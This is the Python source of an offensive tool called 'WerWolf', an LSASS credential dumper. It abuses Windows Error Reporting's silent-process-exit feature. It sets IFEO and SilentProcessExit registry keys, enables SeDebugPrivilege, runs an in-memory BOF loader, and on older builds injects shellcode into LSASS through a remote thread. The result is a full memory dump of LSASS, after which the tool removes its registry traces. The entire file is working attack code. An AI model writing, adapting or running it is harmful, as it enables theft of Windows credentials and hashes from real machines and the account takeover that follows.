import sys
import os
import time
import glob
import struct
import subprocess
import logging
import platform
import ctypes
import ctypes.wintypes


BANNER = r"""
                          ..
                         / _}
                  _     /  /
                / `\  /  /
                \   \/  /     WerWolf
                 \     /      --------
             ,    )   (       LSASS Credential Dumper
            / \_ / \   \      via RtlReportSilentProcessExit
           /       /    \
          /   __  /   _  \    Abusing Windows Error Reporting
         /   /  \/   / \  |   In-Memory COFF/BOF Loader
        |   /   /   /   | |
         \_/   /   /  _/ /
               \__/\_/ \_/
"""

BOF_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bofs", "wer_execute.o")
DUMP_DIR = r"C:\Windows\Temp"
IFEO_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe"
SILENT_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"

# Windows constants
PROCESS_ALL_ACCESS = 0x1FFFFF
PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
TH32CS_SNAPPROCESS = 0x00000002


def ensure_wersvc():
    r = subprocess.run(["sc", "query", "WerSvc"], capture_output=True, text=True)
    if "RUNNING" in r.stdout:
        print("[+] WerSvc is running")
        return
    print("[*] WerSvc is stopped, starting...")
    subprocess.run(["sc", "config", "WerSvc", "start=", "demand"], capture_output=True)
    subprocess.run(["sc", "start", "WerSvc"], capture_output=True)
    for _ in range(10):
        time.sleep(1)
        r = subprocess.run(["sc", "query", "WerSvc"], capture_output=True, text=True)
        if "RUNNING" in r.stdout:
            print("[+] WerSvc started")
            return
    print("[!] WerSvc failed to start")
    sys.exit(1)


def enable_sedebug():
    ntdll = ctypes.windll.ntdll
    was = ctypes.c_bool(False)
    status = ntdll.RtlAdjustPrivilege(ctypes.c_ulong(20), True, False, ctypes.byref(was))
    if status != 0:
        print(f"[!] SeDebugPrivilege failed: 0x{status & 0xFFFFFFFF:08X}")
        print("[!] Run as Administrator.")
        sys.exit(1)
    print("[+] SeDebugPrivilege enabled")


def setup_registry():
    import winreg
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, IFEO_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "GlobalFlag", 0, winreg.REG_DWORD, 0x200)
    winreg.CloseKey(key)
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, SILENT_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "ReportingMode", 0, winreg.REG_DWORD, 0x2)
    winreg.SetValueEx(key, "LocalDumpFolder", 0, winreg.REG_SZ, DUMP_DIR)
    winreg.SetValueEx(key, "DumpType", 0, winreg.REG_DWORD, 0x2)
    winreg.CloseKey(key)


def cleanup_registry():
    import winreg
    try:
        k = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, IFEO_KEY, 0, winreg.KEY_SET_VALUE)
        try: winreg.DeleteValue(k, "GlobalFlag")
        except FileNotFoundError: pass
        winreg.CloseKey(k)
    except OSError: pass
    try: winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, SILENT_KEY)
    except OSError: pass


def find_lsass_pid():
    """Find lsass.exe PID via CreateToolhelp32Snapshot."""
    k32 = ctypes.windll.kernel32

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", ctypes.c_ulong),
            ("cntUsage", ctypes.c_ulong),
            ("th32ProcessID", ctypes.c_ulong),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", ctypes.c_ulong),
            ("cntThreads", ctypes.c_ulong),
            ("th32ParentProcessID", ctypes.c_ulong),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", ctypes.c_ulong),
            ("szExeFile", ctypes.c_char * 260),
        ]

    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return 0
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(pe)
    if k32.Process32First(snap, ctypes.byref(pe)):
        while True:
            name = pe.szExeFile.decode("ascii", errors="ignore").lower()
            if name == "lsass.exe":
                pid = pe.th32ProcessID
                k32.CloseHandle(snap)
                return pid
            if not k32.Process32Next(snap, ctypes.byref(pe)):
                break
    k32.CloseHandle(snap)
    return 0


def trigger_silent_exit_remote(lsass_pid):
    """
    Inject a remote thread into LSASS that calls
    RtlReportSilentProcessExit(NtCurrentProcess(), 0).

    This makes LSASS the ALPC caller, so WerSvc looks up
    "lsass.exe" in the IFEO registry. Works on all Windows
    versions including 1809.
    """
    k32 = ctypes.windll.kernel32

    # Set up proper return types (critical on x64, otherwise pointers get truncated)
    k32.LoadLibraryA.restype = ctypes.c_void_p
    k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    k32.GetProcAddress.restype = ctypes.c_void_p
    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    k32.OpenProcess.restype = ctypes.c_void_p
    k32.OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_bool, ctypes.c_ulong]
    k32.VirtualAllocEx.restype = ctypes.c_void_p
    k32.VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    k32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.CreateRemoteThread.restype = ctypes.c_void_p
    k32.CreateRemoteThread.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]

    # Get address of RtlReportSilentProcessExit in ntdll
    ntdll_handle = k32.LoadLibraryA(b"ntdll.dll")
    if not ntdll_handle:
        print("[!] Failed to load ntdll")
        return False

    rtl_addr = k32.GetProcAddress(ntdll_handle, b"RtlReportSilentProcessExit")
    if not rtl_addr:
        print(f"[!] RtlReportSilentProcessExit not found (ntdll @ 0x{ntdll_handle:016X})")
        return False
    print(f"[*] RtlReportSilentProcessExit @ 0x{rtl_addr:016X}")

    # Open LSASS with thread creation rights
    access = (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
              PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
    hLsass = k32.OpenProcess(access, False, lsass_pid)
    if not hLsass:
        print(f"[!] OpenProcess failed: {k32.GetLastError()}")
        return False

    # Shellcode: calls RtlReportSilentProcessExit(NtCurrentProcess(), 0)
    #
    # NtCurrentProcess() = (HANDLE)-1 = 0xFFFFFFFFFFFFFFFF
    #
    # mov rcx, -1              ; rcx = NtCurrentProcess()
    # xor edx, edx             ; rdx = 0 (ExitStatus)
    # mov rax, <addr>          ; rax = RtlReportSilentProcessExit
    # sub rsp, 0x28            ; shadow space + alignment
    # call rax
    # add rsp, 0x28
    # xor eax, eax             ; return 0
    # ret
    shellcode = bytearray()
    shellcode += b"\x48\xC7\xC1\xFF\xFF\xFF\xFF"  # mov rcx, -1
    shellcode += b"\x31\xD2"                        # xor edx, edx
    shellcode += b"\x48\xB8"                        # mov rax, imm64
    shellcode += struct.pack("<Q", rtl_addr)        # <address>
    shellcode += b"\x48\x83\xEC\x28"                # sub rsp, 0x28
    shellcode += b"\xFF\xD0"                        # call rax
    shellcode += b"\x48\x83\xC4\x28"                # add rsp, 0x28
    shellcode += b"\x31\xC0"                        # xor eax, eax
    shellcode += b"\xC3"                            # ret

    # Allocate memory in LSASS
    remote_buf = k32.VirtualAllocEx(
        hLsass, None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if not remote_buf:
        print(f"[!] VirtualAllocEx failed: {k32.GetLastError()}")
        k32.CloseHandle(hLsass)
        return False

    # Write shellcode
    written = ctypes.c_size_t(0)
    ok = k32.WriteProcessMemory(
        hLsass, remote_buf, bytes(shellcode),
        len(shellcode), ctypes.byref(written)
    )
    if not ok:
        print(f"[!] WriteProcessMemory failed: {k32.GetLastError()}")
        k32.VirtualFreeEx(hLsass, remote_buf, 0, MEM_RELEASE)
        k32.CloseHandle(hLsass)
        return False

    # Create remote thread
    thread_id = ctypes.c_ulong(0)
    hThread = k32.CreateRemoteThread(
        hLsass, None, 0, remote_buf,
        None, 0, ctypes.byref(thread_id)
    )
    if not hThread:
        print(f"[!] CreateRemoteThread failed: {k32.GetLastError()}")
        k32.VirtualFreeEx(hLsass, remote_buf, 0, MEM_RELEASE)
        k32.CloseHandle(hLsass)
        return False

    print(f"[+] Remote thread created in LSASS (TID: {thread_id.value})")
    print("[*] LSASS is now the ALPC caller, WerSvc will look up lsass.exe")

    # Wait for thread to finish
    k32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
    k32.WaitForSingleObject(hThread, 10000)

    # Cleanup
    k32.VirtualFreeEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
    k32.VirtualFreeEx(hLsass, remote_buf, 0, MEM_RELEASE)
    k32.CloseHandle(ctypes.c_void_p(hThread))
    k32.CloseHandle(ctypes.c_void_p(hLsass))
    return True


def get_build_number():
    """Get Windows build number as int."""
    try:
        ver = platform.version()
        return int(ver.split(".")[2])
    except (IndexError, ValueError):
        return 0


def main():
    verbose = "-v" in sys.argv or "--verbose" in sys.argv
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="[%(levelname)s] %(message)s"
    )

    print(BANNER)

    if platform.system() != "Windows":
        print("[!] Windows required."); sys.exit(1)
    if not os.path.isfile(BOF_PATH):
        print(f"[!] BOF not found: {BOF_PATH}"); sys.exit(1)

    with open(BOF_PATH, "rb") as f:
        coff_data = f.read()

    build = get_build_number()
    print(f"[*] BOF file   : {BOF_PATH}")
    print(f"[*] File size  : {len(coff_data):,} bytes")
    print(f"[*] Platform   : {platform.system()} {platform.version()} (build {build})")
    print()

    # 1. WerSvc must be running
    ensure_wersvc()

    # 2. SeDebugPrivilege
    enable_sedebug()

    # 3. Registry
    print("[*] Setting registry keys...")
    setup_registry()
    print("[+] Silent Process Exit configured")
    print()

    start_time = time.time()

    # 4. Run the BOF (handles setup, handle stealing, etc.)
    from loader.loader import CoffLoader
    loader = CoffLoader()
    loader.load_and_execute(coff_data, entry_name="go")

    # 5. Re-set registry (BOF cleans them)
    print()
    setup_registry()

    # 6. On older builds (1809, 1903, 1909), the BOF's external call to
    #    RtlReportSilentProcessExit doesn't trigger LOCAL_DUMP because
    #    WerSvc resolves the ALPC caller's name, not the target's.
    #    Fix: inject a thread into LSASS that calls it from within LSASS.
    if build < 19041:
        print(f"[*] Build {build} detected, using remote thread fallback...")
        lsass_pid = find_lsass_pid()
        if lsass_pid:
            print(f"[+] LSASS PID: {lsass_pid}")
            trigger_silent_exit_remote(lsass_pid)
        else:
            print("[!] Could not find lsass.exe")
    else:
        print("[*] Build >= 19041, BOF external call should work")

    # 7. Wait for dump
    print()
    print("[*] Waiting for WerFault to write the dump...")
    for i in range(60):
        for f in glob.glob(os.path.join(DUMP_DIR, "*.dmp")):
            if os.path.getmtime(f) >= start_time:
                try:
                    size_mb = os.path.getsize(f) / (1024 * 1024)
                    if size_mb > 1:
                        print(f"[+] Dump: {f} ({size_mb:.1f} MB)")
                        cleanup_registry()
                        print("[+] Done.")
                        return
                except OSError:
                    pass
        time.sleep(2)

    print("[!] No dump after 120 seconds.")
    cleanup_registry()
    print(f"[*] Check {DUMP_DIR} manually.")


if __name__ == "__main__":
    main()
